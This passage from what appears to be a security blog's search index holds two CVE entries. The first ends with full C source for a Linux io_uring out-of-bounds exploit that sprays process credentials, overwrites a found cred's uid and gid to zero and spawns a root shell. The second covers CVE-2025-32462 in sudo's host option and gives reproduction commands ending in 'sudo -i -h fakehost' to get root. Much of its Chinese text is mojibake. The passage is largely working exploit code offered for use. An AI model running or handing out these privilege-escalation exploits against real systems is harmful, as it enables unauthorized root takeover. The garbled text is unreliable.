class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mqueue.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/resource.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/in.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netinet/tcp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_DRAIN 100 <span class="hljs-comment">// Wait for modifying the cred cache</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_SPRAY 2000 <span class="hljs-comment">// Number of clones to spray</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000 <span class="hljs-comment">// Size of a memory page</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PAGES 100 <span class="hljs-comment">// Maximum number of pages to allocate</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timespec</span> <span class="hljs-title">timer</span> =</span> &#123;<br>    .tv_sec = <span class="hljs-number">1145141919</span>,<br>    .tv_nsec = <span class="hljs-number">0</span>,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RED <span class="hljs-string">&quot;\033[1;31m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_GREEN <span class="hljs-string">&quot;\033[1;32m&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COLOR_RESET <span class="hljs-string">&quot;\033[0m&quot;</span></span><br><span class="hljs-type">int</span> check_root_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">char</span> bin_sh_str[] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-type">char</span> child_pipe_buf[<span class="hljs-number">1</span>];<br><span class="hljs-comment">// char root_str[] = &quot;Finally get root privilege!\n&quot;;</span><br><span class="hljs-type">char</span> root_str[] = <span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span><br>                  <span class="hljs-string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;<br><br><span class="hljs-type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="hljs-literal">NULL</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;%s[-]%s : %s%s\n&quot;</span>, COLOR_RED, buf, strerror(errno), COLOR_RESET);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">check_ret</span><span class="hljs-params">(<span class="hljs-type">int</span> ret,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    <span class="hljs-keyword">if</span>(ret &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(buf);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">log_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[+] %s\n&quot;</span>, buf);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">log_fail_msg</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf)</span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;[-] %s\n&quot;</span>, buf);<br>&#125;;<br><span class="hljs-comment">// clear the cred_cache the system have so that when we fork a subprocess, the credential will create with new buddy_memory</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_cred_cache</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_DRAIN; i++)&#123;<br>        <span class="hljs-type">int</span> ret = fork();<br>        <span class="hljs-keyword">if</span>(!ret)&#123;<br>            read(check_root_pipe[<span class="hljs-number">0</span>],child_pipe_buf,<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)&#123;<br>                write(<span class="hljs-number">1</span>, root_str, <span class="hljs-number">80</span>);<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>            &#125;<br>            sleep(<span class="hljs-number">100000000</span>);<br>        &#125;<br>        check_ret(ret, <span class="hljs-string">&quot;fork fail&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//clear buddy memory that ord is 0, 1, 2..and so on.</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear_buddy</span><span class="hljs-params">()</span>&#123;<br>    log_msg(<span class="hljs-string">&quot;Buddy system cache cleared&quot;</span>);<br>    <span class="hljs-type">void</span>* page[MAX_PAGES];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        page[i] = mmap(<span class="hljs-number">0x60000000</span> + i * <span class="hljs-number">0x200000U</span>L, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_PAGES; i++)&#123;<br>        *(<span class="hljs-type">char</span> *)page[i] = <span class="hljs-string">&#x27;a&#x27;</span>; <br>    &#125;<br>&#125;<br><br>__attribute__ ((naked)) <span class="hljs-type">long</span> <span class="hljs-title function_">simple_clone</span><span class="hljs-params">(<span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> (*fn)(<span class="hljs-type">void</span> *))</span>&#123;<br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov r15, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r10, r10\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r8, r8\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor r9, r9\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 56\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">//clone()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   je child_fn\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   ret\n&quot;</span> <span class="hljs-comment">// parent</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;child_fn:\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jmp r15\n&quot;</span> <span class="hljs-comment">// child</span></span><br><span class="hljs-params">    )</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">wait_for_root_fn</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <span class="hljs-comment">// Wait for root privilege</span><br>    __asm__ <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1);</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rax, [check_root_pipe]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdi, rdi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov edi, dword ptr [rax]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rsi, child_pipe_buf\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdx, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rax, rax\n&quot;</span> <span class="hljs-comment">// read(check_root_pipe[0], child_pipe_buf, 1)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 102\n&quot;</span> <span class="hljs-comment">//getuid()</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   cmp rax, 0\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   jne failed\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rdi, 1\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [bin_sh_str]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rsi, [shell_args]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rdx, rdx\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 59\n&quot;</span> <span class="hljs-comment">// execve(&quot;/bin/sh&quot;, args, NULL)</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;failed: \n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   lea rdi, [timer]\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   xor rsi, rsi\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   mov rax, 35\n&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;   syscall\n&quot;</span> <span class="hljs-comment">// nanosleep(&amp;timer, NULL)</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> <span class="hljs-built_in">set</span>;<br>CPU_ZERO(&amp;<span class="hljs-built_in">set</span>);<br>CPU_SET(sched_getcpu(), &amp;<span class="hljs-built_in">set</span>);<br><span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">set</span>), &amp;<span class="hljs-built_in">set</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>perror(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br><span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>    <span class="hljs-comment">// clear cred cache</span><br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// io_uring setup</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iovec</span>;</span><br>    <span class="hljs-comment">// buffer for read/write operations</span><br>    <span class="hljs-type">int</span> memfd;<br>    <span class="hljs-type">int</span> rw_fd;<br>    <span class="hljs-type">int</span> page_offset = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">uint64_t</span> start_addr = <span class="hljs-number">0x800000000</span>;<br>    <span class="hljs-type">int</span> nr_pages = <span class="hljs-number">500</span>;<br>    <span class="hljs-type">char</span>* rw_buffer;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">1000</span>];<br>    log_msg(<span class="hljs-string">&quot;Clearing cred cache&quot;</span>);<br>    pipe(check_root_pipe);<br>    clear_cred_cache();<br>    log_msg(<span class="hljs-string">&quot;Clearing buddy system cache&quot;</span>);<br>    <span class="hljs-comment">// Clear buddy system cache (implementation not shown in the original code)</span><br>    clear_buddy();<br>    log_msg(<span class="hljs-string">&quot;Setting up io_uring&quot;</span>);<br>    check_ret(io_uring_queue_init(<span class="hljs-number">8</span>, &amp;ring, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;io_uring_setup failed&quot;</span>);<br>    <span class="hljs-comment">// io_uring_register_buffers(&amp;ring, iovec, 1);</span><br>    log_msg(<span class="hljs-string">&quot;Preparing buffer for registration&quot;</span>);<br>    <br><br>    <span class="hljs-comment">// Create memfd for io_uring buffer</span><br>    memfd = memfd_create(<span class="hljs-string">&quot;io_register_buf&quot;</span>, MFD_CLOEXEC);<br>    check_ret(memfd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    rw_fd = memfd_create(<span class="hljs-string">&quot;read_write_file&quot;</span>, MFD_CLOEXEC);<br>    check_ret(rw_fd, <span class="hljs-string">&quot;memfd_create failed&quot;</span>);<br>    <br>    check_ret(fallocate(memfd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;memfd fallocate failed&quot;</span>);<br>    check_ret(fallocate(rw_fd, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span> * PAGE_SIZE), <span class="hljs-string">&quot;rw_fd fallocate failed&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        check_ret(mmap(start_addr + i * PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, memfd, <span class="hljs-number">0</span>), <span class="hljs-string">&quot;mmap failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">// Register buffer for io_uring</span><br>    log_msg(<span class="hljs-string">&quot;Registering buffer for io_uring&quot;</span>);<br>    iovec.iov_base = start_addr;<br>    iovec.iov_len = nr_pages * PAGE_SIZE;<br>    rw_buffer = mmap(<span class="hljs-literal">NULL</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, rw_fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (rw_buffer == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;mmap rw_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    check_ret(io_uring_register_buffers(&amp;ring, &amp;iovec, <span class="hljs-number">1</span>), <span class="hljs-string">&quot;io_uring_register_buffers failed&quot;</span>);<br>    <span class="hljs-comment">// spred cred</span><br>    log_msg(<span class="hljs-string">&quot;Spraying credentials&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; CRED_SPRAY; i++)&#123;<br>        <span class="hljs-comment">// check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_THREAD | CLONE_SIGHAND, wait_for_root_fn), &quot;clone failed&quot;);</span><br>        check_ret(simple_clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, wait_for_root_fn), <span class="hljs-string">&quot;clone failed&quot;</span>);<br>    &#125;<br><br>    log_msg(<span class="hljs-string">&quot;Searching for cred that we sprayed&quot;</span>);<br>    <span class="hljs-comment">// Search for the sprayed credentials</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nr_pages; i++)&#123;<br>        sqe = io_uring_get_sqe(&amp;ring);<br>        <span class="hljs-keyword">if</span> (sqe == <span class="hljs-literal">NULL</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>        &#125;<br>        io_uring_prep_write_fixed(sqe, rw_fd, start_addr + i*PAGE_SIZE, PAGE_SIZE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>        io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>        io_uring_cqe_seen(&amp;ring, cqe);<br>        <span class="hljs-type">int</span> uid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> gid = ((<span class="hljs-type">int</span> *)(rw_buffer))[<span class="hljs-number">2</span>];<br>        <span class="hljs-keyword">if</span>(uid == <span class="hljs-number">1000</span> &amp;&amp; gid == <span class="hljs-number">1000</span>)&#123;<br>            log_msg(<span class="hljs-string">&quot;Found the target cred page&quot;</span>);<br>            page_offset = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(page_offset &lt; <span class="hljs-number">0</span>)&#123;<br>        log_fail_msg(<span class="hljs-string">&quot;Not find cred page&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    log_msg(<span class="hljs-string">&quot;Editing cred&#x27;s uid to 0&quot;</span>);<br>    <span class="hljs-type">uint32_t</span>* cred = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)rw_buffer;<br>    <span class="hljs-comment">// cred[0] = 0x2; // Keep usage unchanged</span><br>    cred[<span class="hljs-number">1</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set uid to 0</span><br>    cred[<span class="hljs-number">2</span>] = <span class="hljs-number">0x0</span>;<br>    cred[<span class="hljs-number">3</span>] = <span class="hljs-number">0x0</span>; <span class="hljs-comment">// Set suid and sgid to 0</span><br>    cred[<span class="hljs-number">4</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">5</span>] = <span class="hljs-number">0x0</span>; <br>    cred[<span class="hljs-number">6</span>] = <span class="hljs-number">0x0</span>; <br><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    <span class="hljs-keyword">if</span>(sqe == <span class="hljs-literal">NULL</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;io_uring_get_sqe failed&quot;</span>);<br>    &#125;<br>    io_uring_prep_read_fixed(sqe, rw_fd, start_addr + page_offset * PAGE_SIZE, <span class="hljs-number">28</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    check_ret(io_uring_submit(&amp;ring), <span class="hljs-string">&quot;io_uring_submit failed&quot;</span>);<br>    io_uring_wait_cqe(&amp;ring, &amp;cqe);<br>    io_uring_cqe_seen(&amp;ring, cqe);<br><br>    log_msg(<span class="hljs-string">&quot;check privilege in child processes&quot;</span>);<br>    write(check_root_pipe[<span class="hljs-number">1</span>],buf, CRED_SPRAY+CRED_DRAIN);<br>    sleep(<span class="hljs-number">100000000</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>The main principle of the above exploit is to exhaust the credentials of the process and occupy as much buddy_memory as possible, so that when we spray the process (credential), the target can be within 500 consecutive pages. In this way, we can find the sprinkled credentials within 500 pages and generate a root shell.</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>io_uring</tag>
      
      <tag>EXP</tag>
      
      <tag>CVE</tag>
      
      <tag>OOB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-32462</title>
    <link href="/2025/07/21/CVE-2025-32462/"/>
    <url>/2025/07/21/CVE-2025-32462/</url>
    
    <content type="html"><![CDATA[<h1 id="cve-2025-32462"><a href="#cve-2025-32462" class="headerlink" title="cve-2025-32462"></a>cve-2025-32462</h1><p><a href="https://github.com/sudo-project/sudo/blob/SUDO_1_8_8/NEWS">sudo&#x2F;NEWS at SUDO_1_8_8 Â· sudo-project&#x2F;sudo Â· GitHub</a></p><p>sudo -h(â€“host)çš„æ–‡æ¡£é‡Œ å†™äº†-h åªä¸-lå¯ä»¥ç›¸è¿ä½¿ç”¨ã€‚åæœŸæ›´æ–°çš„æ—¶å€™è®©sudo -hå¯ä»¥å’Œ-eï¼Œ-iç­‰ä¸€èµ·ä½¿ç”¨</p><span id="more"></span><p>sudo â€“host(-h) &lt;username&gt; -l(â€“list)</p><p><code>/etc/sudoer.d</code>ç”¨äºæŸ¥çœ‹ä¸€ä¸ªç”¨æˆ·åœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰ä»€ä¹ˆæƒé™ã€‚è¿™ä¸ªæƒé™æœ‰å¯èƒ½è¢«è¶Šè¿‡ï¼Œè®©ä¸€ä¸ªç”¨æˆ·èƒ½å¤Ÿåœ¨æŸä¸€ç³»ç»Ÿçš„æƒé™æå‡åˆ°å¦ä¸€ä¸ªç³»ç»Ÿä¸Šå¯èƒ½æ‹¥æœ‰çš„æƒé™ã€‚å¯¹äºåœ¨å¤šå°è®¡ç®—æœºä¹‹é—´å…±äº«å•ä¸ªsudoersé…ç½®æ–‡ä»¶æˆ–ä½¿ç”¨åŸºäºç½‘ç»œçš„ç”¨æˆ·ç›®å½•ï¼ˆå¦‚LDAPï¼‰æ¥æä¾›ç³»ç»Ÿsudoersè§„åˆ™çš„ç³»ç»Ÿå°¤å…¶æœ‰å½±å“ã€‚</p><p>æ€»ç»“æ¥è¯´ï¼šsudoçš„ <code>h/--host</code> Â é€‰é¡¹æœªéµå¾ªæœ€å°æƒé™åŸåˆ™ï¼Œåœ¨é<code>-l</code>åœºæ™¯ï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œï¼‰ä¸­æœªéªŒè¯ä¸»æœºè§„åˆ™è¾¹ç•Œã€‚æ”»å‡»è€…å¯ä»¥åœ¨<code>/etc/sudoer.d</code>æ–‡ä»¶ä¸­é…ç½®æ¶æ„è§„åˆ™</p><h3 id="sudoer-dç¼–å†™è§„åˆ™"><a href="#sudoer-dç¼–å†™è§„åˆ™" class="headerlink" title="sudoer.dç¼–å†™è§„åˆ™"></a>sudoer.dç¼–å†™è§„åˆ™</h3><p>&lt; user &gt; &lt; pc &gt; &#x3D; [å­—æ®µ1]  [å­—æ®µ2]  [å­—æ®µ3]</p><p>ç”¨æˆ·<code>user</code>å¯ä»¥åœ¨ä¸»æœº<code>pc</code>ä¸Šâ€¦..<br>å­—æ®µä¸€è¡¨ç¤ºå¯¹å“ªäº›ç”¨æˆ·&#x2F;ç»„ï¼Œæ ¼å¼ä¸ºï¼š ï¼ˆusers: groupsï¼‰<br>å­—æ®µäºŒè¡¨ç¤ºæ˜¯å¦éœ€è¦å¯†ç <br>å­—æ®µä¸‰è¡¨ç¤ºå¯ä»¥æ‰§è¡Œçš„å‘½ä»¤</p><p>example:</p><ul><li>ubuntu  fakehost&#x3D;(root)  NOPASSWD : ALL</li></ul><h3 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h3><p>ä¸»è¦å½±å“é‚£äº›åœ¨å¤šå°æœºå™¨ä¸Šä½¿ç”¨åŒä¸€ä»½ sudoers æ–‡ä»¶çš„ç³»ç»Ÿç®¡ç†å‘˜çš„ç³»ç»Ÿã€‚</p><h3 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h3><p>æ¼æ´æ”»å‡»éœ€è¦æ»¡è¶³ä¸¤ä¸ªè¦æ±‚</p><ul><li><p>æ”»å‡»è€…è·å¾—ä¸€ä¸ªå·²éªŒè¯çš„ç”¨æˆ·</p></li><li><p>ç³»ç»Ÿéé»˜è®¤é…ç½®ï¼Œä¾èµ–äºsudoersæ–‡ä»¶ä¸­å­˜åœ¨çš„é¢å¤–è§„åˆ™</p></li></ul><p>ä¾‹å­ï¼š</p><p>sudoersæ–‡ä»¶åŒ…å«å®šä¹‰è¯¥ç”¨æˆ·åœ¨ä¸åŒç³»ç»Ÿä¸Šæƒé™çš„è§„åˆ™ã€‚</p><p>Alice hostA: some Privilege</p><p>Bob hostB: some Privilege</p><p>Bob logs into hostA, then run command <code>sudo -h hostB commandA</code></p><h3 id="å¤ç°è¿‡ç¨‹"><a href="#å¤ç°è¿‡ç¨‹" class="headerlink" title="å¤ç°è¿‡ç¨‹"></a>å¤ç°è¿‡ç¨‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/SpongeBob-369/cve-2025-32462.git<br><span class="hljs-built_in">cd</span> cve-2025-32462<br><span class="hljs-built_in">chmod</span> +x run.sh<br>./run.sh<br><span class="hljs-comment"># after entering the contain Ubuntu</span><br><span class="hljs-built_in">sudo</span> -l<br><span class="hljs-comment"># then prompt you to enter your password, but &quot;we&quot; don&#x27;t know.</span><br><span class="hljs-built_in">sudo</span> -l -h fakehost    <span class="hljs-comment"># Check the permissions user ubuntu have in host named  fakehost</span><br><span class="hljs-built_in">sudo</span> -i -h fakehost    <span class="hljs-comment"># get root</span><br></code></pre></td></tr></table></figure><p>:</p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>EXP</tag>
      
      <tag>sudo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
